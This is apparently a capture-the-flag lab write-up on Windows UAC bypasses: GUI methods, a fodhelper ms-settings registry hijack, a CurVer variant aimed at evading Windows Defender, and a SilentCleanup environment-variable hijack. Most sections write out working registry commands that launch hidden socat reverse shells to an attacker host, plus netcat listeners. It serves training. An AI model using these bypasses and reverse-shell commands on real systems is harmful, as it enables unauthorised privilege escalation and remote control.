# Room Information

# Room Tasks

## UAC: GUI Based Bypasses

```Bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.99.2 /u:attacker /p:Password321
[20:13:26:263] [2893:2902] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - CN = MYSERVER
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.99.2:3389) 
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] -        MYSERVER
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.99.2:3389 (RDP-Server):
        Common Name: MYSERVER
        Subject:     CN = MYSERVER
        Issuer:      CN = MYSERVER
        Thumbprint:  39:4b:bf:3b:3b:46:6c:c0:58:83:72:7b:29:9d:bc:2f:45:58:d2:df:ec:3b:1e:20:7e:df:73:e2:61:35:d2:69
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[20:13:34:494] [2893:2902] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:13:35:201] [2893:2902] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:13:35:214] [2893:2902] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

![]()

![]()

![]()

![]()

![]()

```PowerShell
C:\Windows\system32>C:\flags\GetFlag-msconfig.exe
Starting...
THM{UAC_HELLO_WORLD}
Press enter to continue...
```


**TASK COMPLETED!**

```Bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.99.2 /u:attacker /p:Password321
[20:13:26:263] [2893:2902] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - CN = MYSERVER
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.99.2:3389) 
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] -        MYSERVER
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.99.2:3389 (RDP-Server):
        Common Name: MYSERVER
        Subject:     CN = MYSERVER
        Issuer:      CN = MYSERVER
        Thumbprint:  39:4b:bf:3b:3b:46:6c:c0:58:83:72:7b:29:9d:bc:2f:45:58:d2:df:ec:3b:1e:20:7e:df:73:e2:61:35:d2:69
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[20:13:34:494] [2893:2902] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:13:35:201] [2893:2902] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:13:35:214] [2893:2902] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

```PowerShell
C:\Windows\System32>C:\flags\GetFlag-azman.exe
THM{GUI_UAC_BYPASSED_AGAIN}
Press enter to continue...
```


**TASK COMPLETED!**

## UAC: Auto-Elevating Processes

```Bash
┌──(kali㉿kali)-[~]
└─$ nc 10.10.99.2 9999
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```Bash
C:\Windows\system32>whoami
whoami
myserver\attacker
```

```Bash
C:\Windows\system32>net user attacker | find "Local Group"
net user attacker | find "Local Group"
Local Group Memberships      *Administrators       *Users                
```

```Bash
C:\Windows\system32>whoami /groups | find "Label"
whoami /groups | find "Label"
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

```Bash
C:\Windows\system32>set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
```

```Bash
C:\Windows\system32>set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.54.63:1234 EXEC:cmd.exe,pipes"
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.54.63:1234 EXEC:cmd.exe,pipes"
```

```Bash
C:\Windows\system32>reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.
```

```Bash
C:\Windows\system32>reg add %REG_KEY% /d %CMD% /f
reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.
```

```Bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                  
listening on [any] 1234 ...
```

```Bash
C:\Windows\system32>fodhelper.exe
fodhelper.exe
```

```Bash
listening on [any] 1234 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.99.2] 49767
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```Bash
C:\Windows\system32>C:\flags\GetFlag-fodhelper.exe
C:\flags\GetFlag-fodhelper.exe
Starting...
THM{AUTOELEVATE4THEWIN}
Press enter to continue...
```


**TASK COMPLETED!**

```Bash
C:\Windows\system32>reg delete HKCU\Software\Classes\ms-settings\ /f
reg delete HKCU\Software\Classes\ms-settings\ /f
The operation completed successfully.
```

## UAC: Improving the Fodhelper Exploit to Bypass Windows Defender

```Bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.99.2 /u:attacker /p:Password321
[20:13:26:263] [2893:2902] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - CN = MYSERVER
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.99.2:3389) 
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] -        MYSERVER
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.99.2:3389 (RDP-Server):
        Common Name: MYSERVER
        Subject:     CN = MYSERVER
        Issuer:      CN = MYSERVER
        Thumbprint:  39:4b:bf:3b:3b:46:6c:c0:58:83:72:7b:29:9d:bc:2f:45:58:d2:df:ec:3b:1e:20:7e:df:73:e2:61:35:d2:69
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[20:13:34:494] [2893:2902] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:13:35:201] [2893:2902] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:13:35:214] [2893:2902] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

![]()

```CMD
C:\Users\attacker>set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.54.63:1234 EXEC:cmd.exe,pipes"
```

```CMD
C:\Users\attacker>reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.
```

```CMD
C:\Users\attacker>reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.
```

```Bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

```CMD
C:\Users\attacker>fodhelper.exe
```

```Bash
listening on [any] 1234 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.99.2] 49785
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```CMD
C:\Windows\system32>C:\flags\GetFlag-fodhelper-curver.exe
C:\flags\GetFlag-fodhelper-curver.exe
THM{AV_UAC_BYPASS_4_ALL}
Press enter to continue...
```


**TASK COMPLETED!**

```CMD
C:\Windows\system32>reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\.thm\" /f
The operation completed successfully.
```

```CMD
C:\Windows\system32>reg delete "HKCU\Software\Classes\ms-settings\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
The operation completed successfully.
```

## UAC: Environment Variable Expansion

```Bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp /v:10.10.99.2 /u:attacker /p:Password321
[20:13:26:263] [2893:2902] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[20:13:26:264] [2893:2902] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:13:27:781] [2893:2902] [WARN][com.freerdp.crypto] - CN = MYSERVER
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.99.2:3389) 
[20:13:27:813] [2893:2902] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] -        MYSERVER
[20:13:27:814] [2893:2902] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.99.2:3389 (RDP-Server):
        Common Name: MYSERVER
        Subject:     CN = MYSERVER
        Issuer:      CN = MYSERVER
        Thumbprint:  39:4b:bf:3b:3b:46:6c:c0:58:83:72:7b:29:9d:bc:2f:45:58:d2:df:ec:3b:1e:20:7e:df:73:e2:61:35:d2:69
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[20:13:34:494] [2893:2902] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:13:35:011] [2893:2902] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:13:35:201] [2893:2902] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:13:35:214] [2893:2902] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

![]()

```Bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

```Bash
┌──(kali㉿kali)-[~]
└─$ nc 10.10.99.2 9999                   
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```CMD
C:\Windows\system32>reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.6.54.63:1234 EXEC:cmd.exe,pipes &REM " /f
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.6.54.63:1234 EXEC:cmd.exe,pipes &REM " /f
The operation completed successfully.
```

```CMD
C:\Windows\system32>schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
SUCCESS: Attempted to run the scheduled task "\Microsoft\Windows\DiskCleanup\SilentCleanup".
```

```Bash
listening on [any] 1234 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.99.2] 49809
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```CMD
C:\Windows\system32>C:\flags\GetFlag-diskcleanup.exe
C:\flags\GetFlag-diskcleanup.exe
THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
Press enter to continue...
```


**TASK COMPLETED!**

```CMD
C:\Windows\system32>reg delete "HKCU\Environment" /v "windir" /f
reg delete "HKCU\Environment" /v "windir" /f
The operation completed successfully.
```
